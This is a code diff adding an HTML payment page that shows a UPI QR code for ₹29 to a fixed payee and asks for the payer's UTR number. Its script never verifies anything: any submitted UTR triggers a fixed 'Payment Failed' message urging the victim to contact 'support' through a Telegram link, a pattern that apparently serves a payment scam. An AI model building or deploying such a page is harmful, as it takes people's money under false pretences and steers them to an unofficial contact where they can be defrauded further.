@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pay ₹29</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: #f9f9f9;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      padding: 20px;
+    }
+
+    .container {
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 30px;
+      width: 100%;
+      max-width: 450px;
+      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.1);
+      animation: fadeIn 0.5s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    h1 {
+      text-align: center;
+      color: #444;
+      margin-bottom: 20px;
+      font-size: 26px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #555;
+      font-weight: 500;
+      font-size: 16px;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      margin-bottom: 12px;
+      font-size: 18px;
+      color: #333;
+      background-color: #fff;
+      transition: all 0.3s ease;
+    }
+
+    input:focus, button:focus {
+      outline: none;
+      border-color: #ffcc00;
+      box-shadow: 0 0 8px rgba(255, 204, 0, 0.5);
+    }
+
+    input::placeholder {
+      color: #aaa;
+    }
+
+    button {
+      background-color: #ffcc00;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e6b800;
+      transform: scale(1.02);
+    }
+
+    .qr-section {
+      margin-bottom: 30px;
+      text-align: center;
+    }
+
+    .qr-section canvas {
+      border: 2px solid #ffcc00;
+      border-radius: 8px;
+      padding: 10px;
+      background-color: #fff;
+    }
+
+    .payment-failed {
+      text-align: center;
+      color: red;
+      font-size: 20px;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+
+    .support-text {
+      text-align: center;
+      margin-top: 12px;
+      color: #555;
+    }
+
+    .telegram-float {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: #0088cc;
+      color: white;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      text-align: center;
+      font-size: 28px;
+      line-height: 60px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      z-index: 999;
+      text-decoration: none;
+    }
+
+    .telegram-float:hover {
+      background-color: #0071b8;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+</head>
+<body>
+  <div class="container" id="page2">
+    <h1>Scan QR Code to Pay ₹29</h1>
+    <div class="qr-section">
+      <canvas id="qr-code"></canvas>
+    </div>
+
+    <label>Your UPI ID:</label>
+    <input type="text" value="gamer.awm@ybl" readonly/>
+
+    <label for="utr">Enter UTR:</label>
+    <input type="text" id="utr" placeholder="Enter your UTR number"/>
+    <button onclick="submitUTR()">Submit</button>
+  </div>
+
+  <div class="container" id="payment-failed" style="display: none;">
+    <h1>Payment Status</h1>
+    <p class="payment-failed">Payment Failed</p>
+    <p class="support-text">If debited, please contact support below 👇</p>
+  </div>
+
+  <a href="https://t.me/axpit_123" class="telegram-float" target="_blank" title="Contact Support on Telegram">✉️</a>
+
+  <script>
+    // Generate QR for ₹29
+    window.onload = function () {
+      const qrCanvas = document.getElementById('qr-code');
+      const upiID = "gamer.awm@ybl";
+      const amount = "29.00";
+      const qrData = `upi://pay?pa=${upiID}&pn=Aaruhi&am=${amount}&cu=INR`;
+
+      QRCode.toCanvas(qrCanvas, qrData, { width: 250 }, function (error) {
+        if (error) console.error('QR Error:', error);
+      });
+    };
+
+    function submitUTR() {
+      const utr = document.getElementById('utr').value;
+      if (!utr) {
+        alert('Please enter your UTR number.');
+        return;
+      }
+
+      // Show failed message
+      document.getElementById('page2').style.display = 'none';
+      document.getElementById('payment-failed').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
